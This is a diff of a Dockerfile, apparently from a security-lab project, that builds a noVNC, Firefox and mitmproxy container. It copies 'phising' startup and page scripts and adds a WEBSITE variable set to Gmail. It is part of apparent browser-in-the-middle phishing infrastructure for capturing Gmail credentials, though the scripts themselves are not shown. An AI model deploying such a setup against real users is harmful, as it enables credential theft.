@@ -1,9 +1,9 @@
 FROM debian:bullseye-slim
 LABEL maintainer="admin@csalab.id"
 WORKDIR /root
-RUN apt update && \
-apt -y upgrade && \
-DEBIAN_FRONTEND=noninteractive apt -yq install \
+RUN apt-get update && \
+apt-get -y upgrade && \
+DEBIAN_FRONTEND=noninteractive apt-get -yq install \
   openbox \
   firefox-esr \
   mitmproxy \
@@ -13,9 +13,10 @@ DEBIAN_FRONTEND=noninteractive apt -yq install \
   tigervnc-standalone-server \
   tigervnc-xorg-extension \
   tigervnc-viewer && \
-apt -y full-upgrade && \
-apt -y autoremove && \
-apt clean all
+apt-get -y full-upgrade && \
+apt-get -y autoremove && \
+apt-get clean all
 COPY script/phising.index.html /usr/share/novnc/index.html
 COPY script/phising.startup.sh /startup.sh
+ENV WEBSITE="https://gmail.com/"
 ENTRYPOINT [ "/bin/bash", "/startup.sh" ]
